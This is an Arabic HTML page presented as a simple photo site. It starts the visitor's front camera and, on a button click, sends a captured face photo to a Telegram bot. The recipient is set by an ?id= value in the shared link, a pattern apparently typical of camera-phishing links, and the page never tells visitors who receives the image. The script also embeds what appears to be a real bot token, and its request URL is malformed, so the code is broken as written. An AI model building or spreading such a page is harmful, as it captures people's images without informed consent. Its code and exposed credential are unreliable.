<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع التصوير السريع</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f4f9; }
        video, canvas { width: 100%; max-width: 400px; border-radius: 10px; margin-top: 10px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 5px; background: #0088cc; color: white; margin: 10px; }
        #status { margin-top: 15px; color: #555; }
    </style>
</head>
<body>

    <h2>مرحباً بك في موقع التصوير</h2>
    <p>اضغط على الزر لالتقاط صورة وإرسالها</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <br>
    <button id="capture">التقاط وإرسال الصورة</button>
    <div id="status"></div>

    <script>
        const botToken = '8757176986:AAFNsvSswM4J_I_adIelUJWTSuqwRvFJgRo';
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        // الحصول على chat_id من الرابط (مثال: ?id=12345)
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        // تشغيل الكاميرا تلقائياً
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; })
            .catch(err => { 
                status.innerText = "خطأ: يجب السماح بالوصول للكاميرا";
                console.error(err);
            });

        document.getElementById('capture').addEventListener('click', () => {
            if (!chatId) {
                status.innerText = "خطأ: لم يتم العثور على معرف المستخدم (ID) في الرابط";
                return;
            }

            status.innerText = "جاري الإرسال...";

            // رسم الصورة من الفيديو إلى الـ Canvas
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى Blob لإرسالها
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', 'تم التقاط هذه الصورة من الموقع');

                // إرسال الصورة إلى تلجرام
                fetch(`https://telegram.org{botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        status.innerText = "تم إرسال الصورة بنجاح!";
                    } else {
                        status.innerText = "فشل الإرسال: " + data.description;
                    }
                })
                .catch(err => {
                    status.innerText = "حدث خطأ في الاتصال";
                    console.error(err);
                });
            }, 'image/jpeg');
        });
    </script>
</body>
</html>
